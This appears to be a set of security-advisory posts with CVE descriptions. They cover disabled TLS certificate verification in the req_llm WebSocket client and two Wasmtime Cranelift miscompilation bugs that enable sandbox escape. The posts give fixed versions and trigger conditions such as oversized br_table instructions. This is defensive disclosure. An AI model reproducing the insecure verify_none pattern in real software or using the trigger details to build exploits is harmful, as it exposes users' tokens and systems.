posts.content: CVE-2026-107685: agentjido req_llm WebSocket client (1.9.0 – 1.28.x) disables TLS certificate validation, letting on-path attackers hijack or modify OpenAI sessions 🛡️ Avoid vulnerable versions & monitor vendor updates. https://radar.offseq.com/threat/improper-certificate-validation-vulnerability-in-the-websocket-streaming-client-in-agentjido-reqllm-46b1400882c2a012 #OffSeq #CVE #Vulnerability #Cybersecurity

CVE-2026-107685.description:
Improper Certificate Validation vulnerability in the WebSocket streaming client in agentjido req_llm allows an on-path attacker to read and modify OpenAI WebSocket sessions, including the authorization bearer token, via a TLS certificate the client does not trust. ReqLLM.Streaming.WebSocketSession.Client.start/3 in lib/req_llm/streaming/web_socket_session/client.ex starts WebSockex without TLS options, and WebSockex defaults to insecure: true, which connects with verify: :verify_none. The option allowlist also drops any caller-supplied cacerts or ssl_options, so an application cannot turn verification on.

The OpenAI Responses, Realtime, and Codex WebSocket paths reach this client and send the API key or OAuth access token in the authorization header. HTTP streaming through Finch and the HTTP/2 duplex session through Mint verify certificates and are not affected.

This issue affects req_llm: from 1.9.0 before 1.29.0.

posts.content: Wasmtime Cranelift backend suffers CRITICAL (CVSS 9.9) numeric truncation vuln (CVE-2026-115889) in <36.0.19 & >=37.0.0 <43.0.0. Risk: sandbox escape & code exec. Upgrade to 36.0.19 or 43.0.0+ now. https://radar.offseq.com/threat/cve-2026-115889-cwe-197-numeric-truncation-error-in-bytecodealliance-wasmtime-0eb82f1023cb1792 #OffSeq #CVE2026115889 #WebAssembly #Security

CVE-2026-115889.description:
## Summary

In Wasmtime prior to v43, the Cranelift compiler backend bit-packs its SSA value indices in a way that can result in silent overflow in release builds, and result in incorrect value references in the IR resulting in arbitrary miscompilation. A very large Wasm function body, or one that is specially crafted to use many SSA values, can use this to force type-confusion or other arbitrary side-effects and escape the sandbox.

Cranelift was changed in Wasmtime v43 to use a full `u32` index, with checks if that limit is exceeded, and so is no longer susceptible to this bug.

## Impact

A Wasmtime engine with default settings (using the Cranelift backend) on any architecture/platform could experience a sandbox escape from a specially-crafted Wasm module.

## Patches

Wasmtime v36.0.19 has been released which fixes this issue.

posts.content: CVE-2026-115893 (CRITICAL, CVSS 9.9) in wasmtime on aarch64 lets user-controlled Wasm modules escape the sandbox via Cranelift's br_table handling. Patch with 36.0.19, 48.0.7, or 49.0.4+. Details: https://radar.offseq.com/threat/cve-2026-115893-cwe-691-insufficient-control-flow-management-in-bytecodealliance-wasmtime-b52df7720387bdc2 #OffSeq #wasmtime #vuln #WebAssembly

CVE-2026-115893.description: Wasmtime is a runtime for WebAssembly. Prior to 36.0.19, 48.0.7, and 49.0.4, the Cranelift compiler backend on aarch64 can compile a Wasm br_table instruction with more than approximately 256,000 targets so that it has an incorrect conditional branch target. The branch can then jump to arbitrary other code at a user-controlled offset, allowing a user-controlled Wasm module to escape the sandbox on aarch64 engines using the default Cranelift backend. This issue is fixed in versions 36.0.19, 48.0.7, and 49.0.4.
